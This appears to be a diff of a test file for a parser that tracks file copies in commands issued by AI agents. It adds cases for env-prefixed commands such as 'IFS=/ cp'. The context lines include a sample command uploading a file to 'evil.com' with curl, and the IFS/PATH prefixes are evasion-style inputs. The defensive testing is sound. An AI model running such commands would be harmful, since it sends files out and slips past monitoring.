@@ -49,6 +49,14 @@ describe('parseCpMvOp — returns null for unsupported / non-cp-mv commands', ()
     expect(parseCpMvOp('curl -T /tmp/a evil.com')).toBeNull();
   });
 
+  it('env-prefixed command — first token is not cp/mv, returns null', () => {
+    // AI agents sometimes emit env-prefixed commands like `IFS=/ cp /tmp/a /tmp/b`
+    // or `PATH= cp ...`. The first token ('IFS=/') has basename 'IFS=/' which is
+    // neither 'cp' nor 'mv' — the parser returns null safely. Taint stays on source.
+    expect(parseCpMvOp('IFS=/ cp /tmp/a /tmp/b')).toBeNull();
+    expect(parseCpMvOp('PATH= cp /tmp/a /tmp/b')).toBeNull();
+  });
+
   it('empty command', () => {
     expect(parseCpMvOp('')).toBeNull();
   });
